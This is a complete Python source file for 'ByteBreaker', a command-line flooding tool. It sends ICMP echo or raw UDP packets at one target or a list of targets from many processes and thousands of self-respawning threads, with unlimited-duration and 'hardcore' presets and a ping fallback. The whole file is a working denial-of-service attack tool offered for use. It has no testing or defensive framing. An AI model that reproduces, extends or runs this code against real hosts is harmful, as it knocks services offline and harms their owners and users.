#!/usr/bin/python3
# -*- coding: utf-8 -*-
# ==========================================================
# ByteBreaker             CLI ONLY
# Bano Seraf CLI Engine
# Author : 34zY
# ==========================================================
# Multi-process + multi-thread RAW flood engine.
# ICMP echo flood + raw UDP flood. Never stops. Self-healing.
# ==========================================================
import os, sys, time, socket, struct, signal, re, pathlib, threading, subprocess, itertools
import multiprocessing as mp
import argparse
import random

if os.name == 'nt':
    import ctypes
    ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)

if sys.version_info >= (3, 7):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

# ------------------------- limits -------------------------
MAX_THREADS      = 20000
MAX_PROCS        = 64
MAX_TARGETS      = 1000
MAX_FILE_SIZE    = 10 * 1024 * 1024
MIN_PACKET_SIZE  = 8
MAX_PACKET_SIZE  = 65499
DEFAULT_SIZE     = 1472
DEFAULT_PORT     = 80
DEFAULT_BURST    = 64
STATS_INTERVAL   = 1.0
ALLOWED_EXTS     = ['.txt', '.list', '.conf']
SO_BINDTODEVICE  = 25

class style():
    RED = '\033[31m'; GREEN = '\033[32m'; YELLOW = '\033[33m'
    BLUE = '\033[34m'; MAGENTA = '\033[35m'; CYAN = '\033[36m'
    WHITE = '\033[37m'; RESET = '\033[0m'; BOLD = '\033[1m'
    BLACK = '\033[30m'; UNDERLINE = '\033[4m'

def banner():
    print(style.BOLD + style.CYAN + r'''
  ____       _                       ____
 | __ ) ___ | |__   ___ _ __ _ __ _| __ ) _ __ ___  ___ _ __  ___
 |  _ \/ _ \| '_ \ / _ \ '__| '__| |  _ \| '__/ _ \/ _ \ '_ \/ __|
 | |_) | (_) | | | |  __/ |  | |  | |_) | | | (_) |  __/ | | \__ \
 |____/ \___/|_| |_|\___|_|  |_|  |____/|_|  \___/\___|_| |_|___/
    ''' + style.RESET + style.MAGENTA + r'''
    [ BANO SERAF CLI - ULTRA ENGINE ]
    ''' + style.RESET + style.WHITE + r'''
-------------------------------------------------------------------
  ByteBreaker | RAW MULTI-PROC FLOODER | Github: http://github.com/34zY
-------------------------------------------------------------------''' + style.RESET)

# ------------------------- validation -------------------------
def validate_ip(ip):
    if not ip or not isinstance(ip, str): return False
    ip = ip.strip()
    if len(ip) > 45: return False
    for c in [';','&','|','`','$','(',')','<','>','\\','\n','\r','\t','"',"'",'{','}']:
        if c in ip: return False
    try:
        socket.inet_pton(socket.AF_INET, ip); return True
    except OSError:
        return False

def resolve_target(t):
    if not t: return None
    t = t.strip()
    if validate_ip(t): return t
    if len(t) > 253 or not re.match(r'^[A-Za-z0-9._-]+$', t): return None
    try:
        return socket.gethostbyname(t)
    except (socket.gaierror, OSError):
        return None

def validate_int(s, lo, hi):
    if s is None: return None
    s = str(s).strip()
    if not re.match(r'^\d+$', s): return None
    v = int(s)
    return v if lo <= v <= hi else None

def validate_file_path(p):
    if not p: return None
    p = p.strip()
    if len(p) > 4096 or '\x00' in p: return None
    try:
        path = pathlib.Path(p).resolve()
    except (OSError, RuntimeError, ValueError):
        return None
    if not path.exists() or not path.is_file(): return None
    if path.stat().st_size > MAX_FILE_SIZE:
        print(style.RED + "[!]" + style.RESET + " File too large"); return None
    if path.suffix.lower() not in ALLOWED_EXTS:
        if input(style.YELLOW + "[?]" + style.RESET + " Unusual extension. Continue? (y/n): ").lower() != 'y':
            return None
    return str(path)

def read_target_file(path):
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        raw = f.read(MAX_FILE_SIZE)
    out = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith('#'): continue
        ip = resolve_target(line)
        if ip and ip not in out: out.append(ip)
        if len(out) >= MAX_TARGETS: break
    return out

# ------------------------- packet building -------------------------
def _checksum(data):
    if len(data) & 1: data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    while s >> 16: s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def build_pool(size, proto, port, count=2048):
    if proto == 'icmp':
        pad = b'B' * max(0, size - 8)
        pool = []
        for i in range(count):
            hdr = struct.pack('!BBHHH', 8, 0, 0, 0xBEEF, i & 0xFFFF)
            body = hdr + pad
            pool.append(struct.pack('!BBHHH', 8, 0, _checksum(body), 0xBEEF, i & 0xFFFF) + pad)
        return pool
    plen = max(0, size - 8)
    payload = b'U' * plen
    pool = []
    for _ in range(count):
        sport = random.randint(1024, 65535)
        pool.append(struct.pack('!HHHH', sport, port, 8 + plen, 0) + payload)
    return pool

def make_sock(proto, iface=None, sndbuf=None):
    if proto == 'icmp':
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, sndbuf or (8 << 20))
    except OSError: pass
    if iface and os.name != 'nt':
        try: s.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE, iface.encode())
        except OSError: pass
    return s

# ------------------------- worker process -------------------------
class Counters:
    __slots__ = ('lock', 'sent')
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = {}

def _ping_loop(ip, size, stop, counters):
    while not stop.is_set():
        cmd = (["ping", "-n", "1", "-l", str(size), "-w", "1000", ip] if os.name == 'nt'
               else ["ping", "-f", "-s", str(size), "-c", "1", ip])
        try:
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL, close_fds=True)
        except (OSError, subprocess.SubprocessError):
            time.sleep(0.25); continue
        with counters.lock: counters.sent[ip] += 1
        while not stop.is_set() and p.poll() is None:
            time.sleep(0.02)
        try:
            p.terminate(); p.wait(timeout=1)
        except (subprocess.TimeoutExpired, OSError):
            try: p.kill()
            except OSError: pass

def _sender(ip, socks, slot, pool, pps, burst, stop, counters, proto, iface, sndbuf):
    it = itertools.cycle(pool)
    sock = socks[slot]
    sendto = sock.sendto
    sent = 0; start = time.time()

    while not stop.is_set():
        n = 0
        try:
            for _ in range(burst):
                sendto(next(it), (ip, 0))
                n += 1
        except OSError:
            pass

        if n:
            sent += n
            with counters.lock: counters.sent[ip] += n

        if n < burst:
            # socket phoot gaya: naya banao aur list ke usi slot me wapas rakho
            try: sock.close()
            except OSError: pass
            time.sleep(0.01)
            try:
                sock = make_sock(proto, iface, sndbuf)
                socks[slot] = sock
                sendto = sock.sendto
            except OSError:
                time.sleep(0.2)
            continue

        if pps:
            drift = sent / pps - (time.time() - start)
            if drift > 0: time.sleep(drift)

def worker_main(cfg, stop, q, widx):
    if cfg['pin'] and hasattr(os, 'sched_setaffinity'):
        try: os.sched_setaffinity(0, {widx % (os.cpu_count() or 1)})
        except OSError: pass

    targets = cfg['targets']
    counters = Counters()
    for ip in targets: counters.sent[ip] = 0

    pool = build_pool(cfg['size'], cfg['proto'], cfg['port'])
    socks, modes, slots = {}, {}, {}

    for ip in targets:
        lst = []
        for _ in range(min(cfg['threads'], 128)):
            try: lst.append(make_sock(cfg['proto'], cfg['iface'], cfg['sndbuf']))
            except OSError: break
        socks[ip] = lst
        modes[ip] = 'raw' if lst else 'ping'
        slots[ip] = itertools.cycle(range(len(lst))) if lst else None
        q.put(('mode', ip, modes[ip], widx))

    workers = {ip: [] for ip in targets}

    def spawn(ip):
        if modes[ip] == 'ping' or not socks[ip]:
            t = threading.Thread(target=_ping_loop,
                                 args=(ip, cfg['size'], stop, counters), daemon=True)
        else:
            slot = next(slots[ip])
            t = threading.Thread(target=_sender,
                                 args=(ip, socks[ip], slot, pool, cfg['pps'], cfg['burst'],
                                       stop, counters, cfg['proto'], cfg['iface'], cfg['sndbuf']),
                                 daemon=True)
        workers[ip].append(t); t.start()

    for ip in targets:
        for _ in range(cfg['threads']): spawn(ip)

    last = {ip: 0 for ip in targets}
    while not stop.is_set():
        time.sleep(STATS_INTERVAL)
        if stop.is_set(): break
        if cfg['respawn']:
            for ip in targets:
                alive = [t for t in workers[ip] if t.is_alive()]
                workers[ip] = alive
                for _ in range(cfg['threads'] - len(alive)):
                    if stop.is_set(): break
                    spawn(ip)
        for ip in targets:
            cur = counters.sent[ip]
            d = cur - last[ip]; last[ip] = cur
            if d: q.put(('stat', ip, d, widx))

    for ip in socks:
        for s in socks[ip]:
            try: s.close()
            except OSError: pass
    q.put(('final', '', 0, widx))

# ------------------------- argument parsing -------------------------
def build_parser():
    p = argparse.ArgumentParser(
        prog='ByteBreaker', add_help=False,
        formatter_class=argparse.RawTextHelpFormatter,
        description='ByteBreaker - high performance raw multi-process ICMP/UDP flooder')
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument('-i', metavar='TARGET', help='single IP or hostname')
    g.add_argument('-l', metavar='FILE', help='file, one target per line')
    p.add_argument('-t', '--threads', default='500', help='threads per process per target (default 500)')
    p.add_argument('-P', '--procs', default='0', help='processes (default = CPU count)')
    p.add_argument('-s', '--size', default=str(DEFAULT_SIZE), help='payload bytes (default 1472, max 65499)')
    p.add_argument('-r', '--rate', default='0', help='per-thread pps limit, 0 = unlimited')
    p.add_argument('-d', '--duration', default='0', help='seconds, 0 = forever')
    p.add_argument('-p', '--port', default=str(DEFAULT_PORT), help='UDP dest port (default 80)')
    p.add_argument('--udp', action='store_true', help='raw UDP flood instead of ICMP')
    p.add_argument('--jumbo', action='store_true', help='shortcut for -s 65499')
    p.add_argument('--hardcore', action='store_true', help='preset: all cores, jumbo, UDP, burst 256')
    p.add_argument('--burst', default=str(DEFAULT_BURST), help='packets per send batch (default 64)')
    p.add_argument('--sndbuf', default='0', help='SO_SNDBUF bytes (default 8MB)')
    p.add_argument('--iface', default=None, help='bind interface (Linux)')
    p.add_argument('--pin', action='store_true', help='pin processes to CPU cores (Linux)')
    p.add_argument('--log', default=None, help='write CSV stats to file')
    p.add_argument('--no-respawn', action='store_true', help='do not auto-heal threads')
    p.add_argument('-h', '--help', action='store_true')
    return p

def parse(argv):
    p = build_parser()
    try:
        a = p.parse_args(argv)
    except SystemExit:
        return None

    threads = validate_int(a.threads, 1, MAX_THREADS)
    procs   = validate_int(a.procs, 0, MAX_PROCS)
    size    = validate_int(a.size, MIN_PACKET_SIZE, MAX_PACKET_SIZE)
    rate    = validate_int(a.rate, 0, 5_000_000)
    dur     = validate_int(a.duration, 0, 86400)
    port    = validate_int(a.port, 1, 65535)
    burst   = validate_int(a.burst, 1, 4096)
    sndbuf  = validate_int(a.sndbuf, 0, 1 << 30)
    if None in (threads, procs, size, rate, dur, port, burst, sndbuf): return None

    if a.jumbo: size = MAX_PACKET_SIZE
    if a.hardcore:
        size = MAX_PACKET_SIZE
        burst = 256
        procs = min(os.cpu_count() or 1, MAX_PROCS)
        threads = 200
        a.udp = True
        a.pin = True

    procs = procs or min(os.cpu_count() or 1, 16)

    if a.i:
        ip = resolve_target(a.i)
        if not ip: return None
        targets = [ip]
    else:
        fp = validate_file_path(a.l)
        if not fp: return None
        targets = read_target_file(fp)
        if not targets: return None

    return dict(targets=targets, threads=threads, procs=procs, size=size,
                pps=rate, duration=dur, port=port, burst=burst,
                sndbuf=sndbuf or (8 << 20), iface=a.iface, pin=a.pin,
                respawn=not a.no_respawn, proto='udp' if a.udp else 'icmp',
                log=a.log)

# ------------------------- parent / main -------------------------
def human(n):
    for u in ('', 'K', 'M', 'G'):
        if n < 1000: return "%.1f%s" % (n, u)
        n /= 1000.0
    return "%.1fT" % n

def main():
    if '-h' in sys.argv or '--help' in sys.argv or len(sys.argv) == 1:
        banner(); build_parser().print_help(); return

    cfg = parse(sys.argv[1:])
    if cfg is None:
        print(style.RED + "[!]" + style.RESET + " Invalid arguments. Use -h.\n"); return

    banner()
    total_workers = len(cfg['targets']) * cfg['procs'] * cfg['threads']
    print(style.YELLOW + "[?]" + style.RESET +
          " proto=%s targets=%d procs=%d threads/proc=%d workers=%d size=%d%s"
          % (cfg['proto'].upper(), len(cfg['targets']), cfg['procs'], cfg['threads'],
             total_workers, cfg['size'],
             " port=%d" % cfg['port'] if cfg['proto'] == 'udp' else ""))

    if total_workers > 5000:
        if input(style.YELLOW + "[?]" + style.RESET + " %d workers. Continue? (y/n): " % total_workers).lower() != 'y':
            return

    logf = None
    if cfg['log']:
        try:
            logf = open(cfg['log'], 'w', buffering=1)
            logf.write("timestamp,target,pps,mbps\n")
            print(style.GREEN + "[+]" + style.RESET + " Logging to %s" % cfg['log'])
        except OSError as e:
            print(style.RED + "[!]" + style.RESET + " Log open fail: %s" % e)

    stop = mp.Event()
    q = mp.Queue()
    procs = []
    shutting = [False]
    totals = {ip: 0 for ip in cfg['targets']}

    def boot(idx):
        pr = mp.Process(target=worker_main, args=(cfg, stop, q, idx), daemon=True)
        pr.start(); procs.append(pr)

    print(style.GREEN + "[+]" + style.RESET + " Starting %d processes..." % cfg['procs'])
    for i in range(cfg['procs']): boot(i)

    start = time.time(); last_time = time.time()
    window = {ip: 0 for ip in cfg['targets']}
    mode_seen = set()
    warned = [False]

    def shutdown(*_):
        if shutting[0]: return
        shutting[0] = True
        stop.set()
        for pr in procs:
            try: pr.join(timeout=2)
            except Exception: pass
            if pr.is_alive():
                try: pr.terminate()
                except Exception: pass
        print("\n" + style.RED + "[!]" + style.RESET + " Stopped after %.1fs." % (time.time() - start))
        print(style.CYAN + "[*] Summary:" + style.RESET)
        for ip in totals:
            print("    %s -> %s packets" % (ip, human(totals[ip])))
        print(style.CYAN + "[*] TOTAL: " + style.RESET + human(sum(totals.values())))
        if logf:
            try: logf.close()
            except OSError: pass
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    if hasattr(signal, 'SIGTERM'): signal.signal(signal.SIGTERM, shutdown)

    try:
        while True:
            time.sleep(0.25)
            while not q.empty():
                try: kind, a, b, widx = q.get_nowait()
                except Exception: break
                if kind == 'mode':
                    mode_seen.add(b)
                elif kind == 'stat':
                    totals[a] += b
                    window[a] = window.get(a, 0) + b

            now = time.time()
            if now - last_time >= STATS_INTERVAL:
                dt = now - last_time
                last_time = now

                procs[:] = [p for p in procs if p.is_alive()]
                while not shutting[0] and len(procs) < cfg['procs']:
                    boot(len(procs))

                if 'ping' in mode_seen and 'raw' not in mode_seen and not warned[0]:
                    warned[0] = True
                    print(style.YELLOW + "[!]" + style.RESET +
                          " Raw sockets band (root/admin?). Ping fallback chal raha hai.")

                total_delta = sum(window.values())
                mbps = (total_delta * (cfg['size'] + 28) * 8) / (dt * 1e6)
                for ip in cfg['targets']:
                    if window.get(ip, 0):
                        pps = window[ip] / dt
                        print(style.GREEN + "[>>] " + style.RESET +
                              "%s | %.0f pps | %.2f Mbps | tx=%s"
                              % (ip, pps, (window[ip] * (cfg['size'] + 28) * 8) / (dt * 1e6),
                                 human(totals[ip])))
                        if logf:
                            try: logf.write("%.0f,%s,%.0f,%.3f\n"
                                            % (time.time(), ip, pps,
                                               (window[ip] * (cfg['size'] + 28) * 8) / (dt * 1e6)))
                            except OSError: pass
                print(style.BLUE + "[==]" + style.RESET +
                      " TOTAL %.2f Mbps | procs=%d/%d | workers=%d | %s"
                      % (mbps, len(procs), cfg['procs'],
                         len(procs) * cfg['threads'] * len(cfg['targets']),
                         "PING" if 'raw' not in mode_seen else "RAW"))
                window = {ip: 0 for ip in cfg['targets']}

            if cfg['duration'] and time.time() - start >= cfg['duration']:
                shutdown()
    except KeyboardInterrupt:
        shutdown()

if __name__ == '__main__':
    main()